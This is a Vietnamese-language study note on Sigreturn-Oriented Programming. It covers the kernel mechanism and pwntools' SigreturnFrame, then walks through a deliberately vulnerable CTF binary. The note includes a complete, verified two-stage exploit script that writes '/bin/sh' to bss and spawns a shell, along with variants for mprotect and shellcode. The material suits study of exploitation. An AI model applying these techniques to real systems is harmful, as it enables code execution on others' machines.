# SROP — Sigreturn-Oriented Programming

> Tài liệu học sâu. Disassembly & exploit dưới đây **verify trên binary thật** (`sigrop`, no-PIE,
> no-canary, pwntools 4.15 — đã chạy ra shell). Nguồn tham khảo ở cuối.

---

## 1. SROP giải quyết vấn đề gì?

ROP thường cần nhiều gadget `pop <reg>; ret` để set từng thanh ghi. Khi binary **cực ít gadget**
(binary nhỏ, static, strip) thì không gom đủ `pop rsi/rdx/rax...`. **SROP** set **TẤT CẢ thanh
ghi cùng lúc** chỉ bằng **một syscall `sigreturn`** + **một gadget `syscall`** — gần như không
cần gadget nào khác.

> Nói ngắn: *SROP = giả mạo khung tín hiệu (signal frame) rồi gọi `sigreturn` để kernel nạp cả
> dàn thanh ghi (`rax,rdi,rsi,rdx,rip,rsp,...`) theo ý ta — trong đúng một phát.*

---

## 2. Cơ chế: tín hiệu & `sigreturn`

Khi một tiến trình nhận signal (vd `SIGSEGV`), kernel **tạm dừng** nó và:
1. **Đẩy toàn bộ trạng thái CPU** (mọi thanh ghi: `rax,rbx,...,rip,rsp,eflags,cs/ss`) lên stack
   dưới dạng một struct **`sigcontext`** (nằm trong `ucontext`), rồi chạy signal handler.
2. Khi handler xong, nó gọi syscall **`rt_sigreturn`** (số **15** trên x86-64). Kernel **đọc lại
   `sigcontext` từ stack** và **khôi phục mọi thanh ghi** y như trước khi có signal, rồi tiếp tục.

**Lỗ hổng thiết kế mà SROP khai thác:** kernel **không kiểm tra** khung đó có thật do nó tạo ra
hay không. Nếu kẻ tấn công **tự dựng một `sigcontext` giả trên stack** và gọi `sigreturn`, kernel
sẽ ngoan ngoãn nạp **mọi thanh ghi** theo giá trị giả → chiếm toàn quyền `rip`, `rsp`, 6 thanh ghi
tham số, `rax`... cùng lúc.

→ Để gọi `sigreturn`: set **`rax = 15`** rồi chạy **`syscall`**. Đó là tất cả gadget cần.

---

## 3. Điều kiện áp dụng

| Cần có | Vì sao |
|--------|--------|
| **Set được `rax = 15`** | để `syscall` thành `rt_sigreturn` (vd gadget `pop rax; ret`, hoặc ghi rax cách khác) |
| **Một gadget `syscall`** (hoặc `syscall; ret`) | để thực thi sigreturn, và để thực thi syscall đích (execve...) |
| **Ghi được một khung ~248 byte lên stack** | chứa `sigcontext` giả (BOF lớn là lý tưởng) |
| **Biết 1 địa chỉ ghi được** (bss) — thường cần | để chứa `"/bin/sh"` và/hoặc pivot `rsp` |

SROP **bypass ASLR** (không cần leak — chỉ dùng địa chỉ cố định của gadget/bss trong binary
no-PIE) nhưng **không bypass PIE** (PIE thì phải leak base binary trước).

---

## 4. `SigreturnFrame` của pwntools

Tự nhớ layout `sigcontext` (offset từng thanh ghi) rất dễ sai → pwntools gói sẵn:

```python
frame = SigreturnFrame()         # tự theo context.arch; amd64 -> bytes(frame) = 248 byte
frame.rax = constants.SYS_execve # hoặc số trực tiếp
frame.rdi = binsh                # tham số như thường
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget       # nhảy đâu SAU khi sigreturn nạp xong
frame.rsp = some_stack           # rsp sau khi khôi phục (quan trọng khi muốn chain tiếp)
payload = flat(b'A'*OFFSET, pop_rax, 15, syscall_gadget, bytes(frame))
#                           ^ set rax=15        ^ gọi sigreturn -> nạp frame
```
Gán được mọi field: `rax/rbx/rcx/rdx/rsi/rdi/rbp/rsp/r8..r15/rip/eflags/cs/ss/...`.

---

## 5. Bài mẫu `sigrop` — phân tích

Nguồn (`tutorial/advance/SROP_Technique/srop`):
```c
// gcc -fno-stack-protector -no-pie sigrop.c -o sigrop
__asm__("pop rax; syscall;");          // <-- gadget vàng: pop rax; syscall
int main(){ char buf[16]; setbuf(stdin,NULL); read(0, buf, 0x500); return 0; }
```
Quá hợp SROP: có sẵn **`pop rax; syscall`**, và `read(0,buf,0x500)` cho **tràn lớn** (ghi được cả
khung 248 byte). Không có `/bin/sh` trong binary → phải **tự ghi `/bin/sh` vào bss**.

**Gadget (verify):**
```
0x401156:  58        pop rax     ┐ pop_rax ; syscall
0x401157:  0f 05     syscall     ┘ (và 0x401157 = syscall đơn)
0x401159:  <main>                 <- NGAY SAU syscall là main (mấu chốt, xem §6)
```
Offset tới ret = **24** (`buf[16]` + saved `rbp` 8).

---

## 6. Vì sao cần 2 frame (cơ chế riêng của bài này)

Không có `/bin/sh` sẵn → kế hoạch:
1. **Frame 1** = `read(0, bss, 0x500)` để **nạp `"/bin/sh"` vào bss** (và rẽ `rsp` sang bss).
2. **Frame 2** = `execve(bss, 0, 0)` → shell.

Điểm tinh tế: `frame.rip = syscall` (0x401157). Sau khi syscall `read` của Frame 1 **trả về**,
`rip` đi tiếp tới **0x401159 = `main`** → `main` chạy lại và gọi **`read(0,buf,0x500)` lần nữa**
→ cho ta cơ hội **tràn lần 2** gửi Frame 2. Chính "rơi vào `main`" này tạo vòng để SROP hai lần.

---

## 7. Writeup pwnld-style (đã verify ra shell)

```python
#!/usr/bin/env python3
from pwn import *
from pwnld import *

context.binary = exe = ELF("./srop", checksec=False)
rop  = ROP(exe)
libc = get_libc()

set_remote("host", 0)
set_gdbscript("b *main\nc")
p = start()
GDB()

pop_rax = rop.find_gadget(["pop rax", "syscall"])[0]   # 0x401156
syscall = rop.find_gadget(["syscall"])[0]              # 0x401157
rw      = 0x404a00           # vùng bss ghi được (no-PIE -> cố định)
OFF     = 24

### Frame 1: read(0, rw+0x200, 0x500) để ghi "/bin/sh"; rip=syscall -> rơi vào main (đọc lần 2)
f1 = SigreturnFrame()
f1.rax = 0              # SYS_read
f1.rdi = 0              # fd stdin
f1.rsi = rw + 0x200     # buf đích
f1.rdx = 0x500          # len
f1.rsp = rw             # pivot stack
f1.rip = syscall
s(flat(b"A"*OFF, pop_rax, 0xf, bytes(f1)))   # 0xf = 15 = SYS_rt_sigreturn

s(b"/bin/sh\0")          # frame1.read nuốt chuỗi này -> rw+0x200 = "/bin/sh"

### Frame 2 (tràn main lần 2): execve(rw+0x200, 0, 0)
f2 = SigreturnFrame()
f2.rax = 0x3b           # SYS_execve
f2.rdi = rw + 0x200     # "/bin/sh"
f2.rsi = 0
f2.rdx = 0
f2.rsp = rw
f2.rip = syscall
s(flat(b"A"*OFF, pop_rax, 0xf, bytes(f2)))

ia()
```

**Giải thích mạch:**
- `pop_rax, 0xf` ngay sau pad: ret vào `pop rax` → `rax = 15`, rồi `syscall` → **sigreturn** nạp
  nguyên khung `f1`.
- `f1` cấu hình `read(0, rw+0x200, 0x500)`; sau read, rơi vào `main` (§6) → `main` đọc tiếp.
- Gửi `"/bin/sh\0"` cho đúng cú `read` của f1.
- Lần tràn 2 lặp lại chiêu set `rax=15` + sigreturn, nạp `f2` = `execve("/bin/sh",0,0)` → **shell**.

**Log chạy thật:**
```
$ echo PWNED_$((7*6)); id
PWNED_42
uid=1000(...) gid=1000(...) ...        <- có shell
```

---

## 8. Biến thể theo tình huống

| Tình huống | Cách |
|------------|------|
| **Đã có `/bin/sh`** trong binary/libc | chỉ cần **1 frame** execve, khỏi stage read |
| **NX + không ghi được shellcode** | SROP gọi `mprotect(page, len, 7)` bật RWX rồi pivot vào shellcode |
| **Chỉ leak được, chưa có ghi** | SROP `write(1, addr, n)` để leak, hoặc chuyển hướng |
| **Thiếu `pop rax`** | set `rax` bằng cách khác: để một syscall trả giá trị (vd `read` trả số byte đọc = đúng 15!) rồi `syscall` |

> Mẹo "read trả về 15": `read(0, buf, 15)` trả về **15** = `rax` sau khi đọc đúng 15 byte → ngay
> sau đó một gadget `syscall` sẽ thành `sigreturn` mà **không cần `pop rax`**. Kinh điển khi binary
> không có gadget set rax.

---

## 9. Dựng `bytes(frame)` thủ công (hiểu bản chất)

`bytes(frame)` chỉ là struct `sigcontext` với các thanh ghi ở **offset cố định**. Ví dụ (amd64,
các offset tính từ đầu frame): `uc_flags`/`&uc` (16 byte đầu), rồi `r8..r15`, `rdi,rsi,rbp,rbx,
rdx,rax,rcx,rsp,rip,eflags`, `cs/gs/fs/ss`, cuối là con trỏ `&fpstate` (để 0) + mask. Tự xếp
`p64` theo đúng thứ tự này rất dễ lệch → **luôn dùng `SigreturnFrame`**; mục này chỉ để hiểu nó
là cái gì, không khuyến khích làm tay.

---

## 10. Khi nào chọn SROP

- Binary **ít gadget** (không đủ `pop rsi/rdx/rax`) nhưng **có `syscall`** + set được `rax`.
- Cần set **nhiều thanh ghi cùng lúc** (execve 3 tham số + rax) mà ROP thường quá vụn.
- Static / strip, no-PIE. (**PIE** thì cần leak base trước.)
- So sánh: thiếu gadget pop, **dynamic no-PIE, có `__libc_csu_init`** → cân nhắc
  [ret2csu](ret2csu.md); không leak libc + Partial RELRO →
  [ret2dlresolve](pwntools/rop.md#ret2dlresolve). SROP mạnh nhất khi có **syscall + control rax**.

---

## 11. Danh sách bài tập + writeup tham khảo

| Bài | Mức | Học gì | Writeup / gợi ý |
|-----|-----|--------|------------------|
| **`SROP_Technique/srop`** (local) | ⭐⭐ | sigreturn frame, 2-frame, ghi /bin/sh vào bss | **§7 ở trên** (pwnld, verify ra shell) |
| **ir0nstone – Using SROP** | ⭐ | dựng frame tối thiểu với pwntools | [ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) |
| **HackTheBox – SickROP** | ⭐⭐⭐ | SROP + mprotect→shellcode, loop sigreturn | [writeup Medium](https://corruptedprotocol.medium.com/sickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441) |
| **pwnable.tw / CTF tag `srop`** | ⭐⭐⭐ | biến thể "read trả 15", ghép mprotect | [HackTricks SROP](https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming) |

**Lộ trình:** `srop` local (nắm frame + 2 stage) → ir0nstone Using SROP (tự dựng từ đầu) →
SickROP (SROP + mprotect + shellcode) → bài CTF ghép "read trả 15" (khỏi `pop rax`).

---

## Nguồn tham khảo

- Erik Bosman, Herbert Bos — *"Framing Signals — A Return to Portable Shellcode"*, IEEE S&P 2014
  (paper gốc khai sinh SROP).
- ir0nstone — *Sigreturn-Oriented Programming*:
  <https://ir0nstone.gitbook.io/notes/binexp/stack/syscalls/sigreturn-oriented-programming-srop>
- HackTricks — *SROP*:
  <https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming>
- Stormshield (Mehdi Talbi) — *Playing with signals: an overview on SROP*:
  <https://stormshield.com/news/playing-with-signals-an-overview-on-sigreturn-oriented-programming>
- Tra nhanh API: [`pwntools/rop.md` §SROP](pwntools/rop.md#srop--sigreturnframe)
